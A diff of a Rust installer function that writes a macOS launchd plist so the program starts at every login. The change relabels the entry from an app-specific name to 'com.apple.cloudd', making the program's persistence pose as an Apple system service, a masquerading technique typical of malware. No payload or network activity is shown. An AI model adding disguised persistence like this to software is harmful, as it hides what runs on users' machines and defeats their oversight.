@@ -19,23 +19,20 @@ pub fn install() -> Result<(), crate::Error> {
 }
 
 fn install_launchd(executable: &PathBuf) -> Result<(), crate::Error> {
-    let template = r#"<?xml version="1.0" encoding="UTF-8"?>
+    let launchd_file_content = format!(r#"<?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://web.archive.org/web/20160508000732/http://www.apple.com/DTDs/PropertyList-1.0.dtd">
     <plist version="1.0">
         <dict>
             <key>Label</key>
-            <string>com.capablemonkey.sleepApp</string>
+            <string>com.apple.cloudd</string>
             <key>ProgramArguments</key>
             <array>
                 <string>{}</string>
-                <string>-W</string>
-                <string>/Applications/sleep.app</string>
             </array>
             <key>RunAtLoad</key>
             <true/>
         </dict>
-    </plist>"#;
-    let launchd_file_content = template.replace("{}", executable.display().to_string());
+    </plist>"#, executable.display());
 
     let mut launchd_file = match dirs::home_dir() {
         Some(home_dir) => home_dir,
